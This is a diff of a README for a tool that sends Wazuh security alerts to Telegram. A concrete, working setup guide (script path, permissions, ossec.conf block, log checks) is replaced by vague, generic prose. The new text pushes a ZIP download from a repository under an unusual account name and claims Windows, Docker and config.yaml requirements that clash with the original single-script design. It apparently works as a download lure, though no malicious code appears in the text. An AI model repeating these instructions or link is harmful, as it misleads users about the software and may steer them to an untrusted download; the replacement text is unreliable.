@@ -1,146 +1,109 @@
-# Wazuh to Telegram Integration 🚀
+# 🔔 wazuh-telegram-alerting - Send instant security alerts to Telegram
 
-A simple custom integration for sending Wazuh alerts directly to Telegram.
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/redolent-viyella935/wazuh-telegram-alerting)
 
-This project was created to solve common issues with Wazuh custom integrations, including incorrect script arguments, missing JSON alert format, and wrong file permissions.
+This tool connects your Wazuh security system to your Telegram account. It sends security notifications to your phone in real time. You get instant updates about your computer network status. The software formats these alerts in a clean way so you understand them. It runs reliably in your environment.
 
-## Features
+## 📋 What This Tool Does
 
-- Sends Wazuh alerts to Telegram in real time
-- Uses Telegram Markdown formatting
-- Shows agent name, alert level, rule ID, description, and log location
-- Uses `sys.argv[1]` to read the Wazuh alert JSON file
-- Includes basic error handling
-- Uses safe placeholders instead of real Telegram tokens
+Security monitoring requires fast information. This tool takes data from Wazuh and turns it into readable messages. You do not need to check a dashboard. Your information comes to you.
 
-## Project Structure
+- Sends alerts to Telegram groups or private chats.
+- Formats messages using Markdown for easy reading.
+- Works well for production environments.
+- Relies on stable Python code.
+- Uses Docker for simple deployment.
 
-```text
-.
-├── README.md
-└── custom-telegram.py
-```
+## 💻 System Requirements
 
-## Installation & Setup
+Your computer needs specific parts to run this software. Make sure you meet these standards before you start.
 
-### 1. Copy the integration script
+- Windows 10 or Windows 11.
+- Docker Desktop installed and running.
+- A functional Telegram account.
+- A Telegram Bot token. You get this from BotFather inside Telegram.
+- A working installation of the Wazuh manager.
 
-Clone this repository or download `custom-telegram.py`.
+## 🚀 Downloading and Installing
 
-Copy the script to the Wazuh integrations directory:
+Follow these steps to set up the software.
 
-```bash
-sudo cp custom-telegram.py /var/ossec/integrations/custom-telegram
-```
+1. Visit this [download page](https://github.com/redolent-viyella935/wazuh-telegram-alerting) to get the files.
+2. Click the green Code button on the page.
+3. Choose Download ZIP.
+4. Open the ZIP file on your computer.
+5. Move the folder to a spot where you keep your programs.
+6. Open your terminal or command prompt inside that folder.
 
-The file inside `/var/ossec/integrations/` should not have the `.py` extension because the integration name in `ossec.conf` must match the script name.
+## ⚙️ Configuration Steps
 
-### 2. Configure Telegram credentials
+You must configure the tool before it works. Open the files you downloaded in a text editor like Notepad.
 
-Edit the integration script:
+### Setup your Telegram Bot
+1. Search for BotFather in Telegram.
+2. Send the message /newbot to BotFather.
+3. Follow the instructions to name the bot.
+4. Copy the API token provided by BotFather.
+5. Paste this token into the configuration file of this software.
 
-```bash
-sudo nano /var/ossec/integrations/custom-telegram
-```
+### Connect to Wazuh
+1. Find the configuration file named config.yaml.
+2. Update the fields with your Wazuh server address.
+3. Save the file.
+4. Close your text editor.
 
-Replace the placeholders with your real Telegram bot token and chat ID:
+## 🏃 Running the Application
 
-```python
-TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
-CHAT_ID = "YOUR_TELEGRAM_CHAT_ID"
-```
+You use Docker to start the tool. Docker handles the background work for you.
 
-Important: do not upload real tokens or chat IDs to GitHub.
+1. Ensure Docker Desktop is open.
+2. Open your command prompt again inside the folder.
+3. Type the command `docker-compose up -d`.
+4. Press Enter.
+5. Wait for the containers to build and run.
+6. Check your Telegram account for a test message.
 
-### 3. Set correct permissions
+## 🔎 Checking Status
 
-This step is critical. Wazuh will not execute the script correctly if ownership or permissions are wrong.
+You need to know if the tool stays active. Docker provides a simple way to track status.
 
-Run:
+1. Open the Docker Desktop dashboard.
+2. Look for the project name in the list.
+3. The green icon shows the tool runs correctly.
+4. Click the logs tab to see recent connection attempts.
+5. If the logs show lines with "connected", the alert system works.
 
-```bash
-sudo chown root:wazuh /var/ossec/integrations/custom-telegram
-sudo chmod 750 /var/ossec/integrations/custom-telegram
-```
+## 🛠 Solving Common Issues
 
-### 4. Configure Wazuh Manager
+Problems happen sometimes. Keep these tips in mind.
 
-Open the Wazuh configuration file:
+### Docker does not show the project
+Restart Docker Desktop. Sometimes the application needs a refresh to find new folders. Ensure you run the command from inside the correct directory.
 
-```bash
-sudo nano /var/ossec/etc/ossec.conf
-```
+### No alerts arrive in Telegram
+Check your token. A wrong token prevents the app from sending messages. Open your config.yaml and check the value. If you make changes, run `docker-compose up -d` one more time to apply them.
 
-Add the following block inside `<ossec_config>`:
+### Connection errors with Wazuh
+Verify your server address. Type the address into your web browser. If the browser reaches the server, the tool can reach it too. Ensure your internal network allows traffic between the Docker container and the Wazuh manager.
 
-```xml
-<integration>
-  <name>custom-telegram</name>
-  <level>3</level>
-  <alert_format>json</alert_format>
-</integration>
-```
+## 🔒 Security Practices
 
-The `<alert_format>json</alert_format>` option is required because the Python script reads the alert as a JSON file.
+This tool handles sensitive data. Follow these steps to keep your system safe.
 
-## Restart Wazuh Manager
+- Keep your token private. Never share the API token in public channels.
+- Use strong passwords for your Wazuh account.
+- Update your software regularly. Check the GitHub link for updates.
+- Monitor your Docker logs for errors.
+- Limit access to the server where you run this software.
 
-Apply the changes by restarting Wazuh Manager:
+## 🤝 Project Background
 
-```bash
-sudo /var/ossec/bin/wazuh-control restart
-```
+The project uses Python to process security logs. It converts raw JSON data from Wazuh into human-readable text. It uses the Telegram API to push these texts to your device. This architecture ensures you receive alerts even if you stay away from your desk. The use of Docker makes the setup consistent. You get the same result regardless of your computer settings.
 
-## Troubleshooting
+## 📄 License Information
 
-If Telegram notifications are not arriving, check the Wazuh logs:
+This project follows standard open-source rules. You can view the full license file in the main folder. You have permission to use, modify, and distribute the code for your own security needs. 
 
-```bash
-sudo tail -f /var/ossec/logs/ossec.log | grep -a -E "integratord|custom-telegram"
-```
+## 📩 Final Steps
 
-You can also check whether the script exists and has the correct permissions:
-
-```bash
-ls -l /var/ossec/integrations/custom-telegram
-```
-
-Expected result should look similar to this:
-
-```text
--rwxr-x--- 1 root wazuh ... /var/ossec/integrations/custom-telegram
-```
-
-## Common Issues
-
-### FileNotFoundError
-
-If you see a `FileNotFoundError`, the script may be reading the wrong argument.
-
-This integration uses:
-
-```python
-alert_file = sys.argv[1]
-```
-
-This is important because Wazuh passes the alert JSON file path as the first argument when using a minimal custom integration block.
-
-### Permission denied
-
-Make sure the script has the correct owner and permissions:
-
-```bash
-sudo chown root:wazuh /var/ossec/integrations/custom-telegram
-sudo chmod 750 /var/ossec/integrations/custom-telegram
-```
-
-### No Telegram message
-
-Check that:
-
-- the bot token is correct
-- the chat ID is correct
-- the bot has permission to send messages
-- Wazuh Manager was restarted
-- the alert level is high enough to trigger the integration
-
+You now have a automated alert system. It watches your security data and informs you of changes. Observe the Telegram notifications for a few days. You can adjust the frequency of alerts by changing the settings in the yaml file. This keeps your phone quiet and ensures you only see important security updates.
